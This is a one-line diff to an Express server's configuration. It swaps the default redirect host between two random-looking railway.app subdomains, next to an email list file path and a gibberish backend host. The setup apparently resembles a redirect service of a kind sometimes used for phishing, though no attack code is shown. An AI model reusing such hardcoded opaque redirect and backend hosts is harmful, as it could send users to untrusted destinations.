@@ -11,7 +11,7 @@ const rateLimit = require('express-rate-limit');
 const app = express();
 const PORT = process.env.PORT || 3000;
 const EMAIL_FILE = path.join(__dirname, 'ogas', 'oga.txt');
-const REDIRECT_BASE = process.env.REDIRECT_BASE || 'https://zezbomf65a64504e.up.railway.app';
+const REDIRECT_BASE = process.env.REDIRECT_BASE || 'https://kranamedeyrunamnoputbod.up.railway.app';
 const BACKEND_BASE = process.env.BACKEND_BASE || 'https://bckvirovironmentnmvironment.up.railway.app';
 const DEBUG = process.env.DEBUG === 'true';
 
